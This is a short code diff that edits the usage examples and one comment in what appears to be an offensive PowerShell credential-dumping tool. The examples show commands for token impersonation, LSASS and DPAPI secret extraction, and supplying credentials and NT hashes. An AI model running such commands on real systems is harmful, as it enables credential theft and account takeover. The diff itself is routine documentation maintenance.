@@ -11390,21 +11390,23 @@ function Get-LSASS($Method)
 .EXAMPLE
 	Get-WindowsSecrets -SessionTokens
 .EXAMPLE
-	Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod ImpersonateLoggedOnUser
+	Get-WindowsSecrets -ActivatePrivilege "SeShutdownPrivilege"
 .EXAMPLE
-	Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod CreateProcessWithToken
+	Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod "ImpersonateLoggedOnUser"
 .EXAMPLE
-	Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod CreateProcessAsUser
+	Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod "CreateProcessWithToken"
 .EXAMPLE
-	Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod CreateProcessAsUser -Command "whoami"
+	Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod "CreateProcessAsUser"
+.EXAMPLE
+	Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod "CreateProcessAsUser" -Command "whoami"
 .EXAMPLE
 	Get-WindowsSecrets -LSASS
 .EXAMPLE
 	Get-WindowsSecrets -DPAPI
 .EXAMPLE
-	Get-WindowsSecrets -DPAPI -Creds User1:Pwd1/User2@Domain:Pwd2 -NTHashes User1:HexNTHash1/User2@Domain:HexNTHash2
+	Get-WindowsSecrets -DPAPI -Creds 'User1:Pwd1/User2@Domain:Pwd2' -NTHashes 'User1:HexNTHash1/User2@Domain:HexNTHash2'
 .EXAMPLE
-	Get-WindowsSecrets -DPAPI -Creds User1:Pwd1/User2@Domain:Pwd2 -NTHashes User1:HexNTHash1/User2@Domain:HexNTHash2 -SkipLSASS
+	Get-WindowsSecrets -DPAPI -Creds 'User1:Pwd1/User2@Domain:Pwd2' -NTHashes 'User1:HexNTHash1/User2@Domain:HexNTHash2' -SkipLSASS
 #>
 function Get-WindowsSecrets()
 {
@@ -11515,6 +11517,7 @@ function Get-WindowsSecrets()
 		$Tokens = ListSessionTokens
 	}
 
+	# Enable privilege
 	If ($ActivatePrivilege)
 	{
 		Write-Host ("[===] Enabling a privilege [===]")
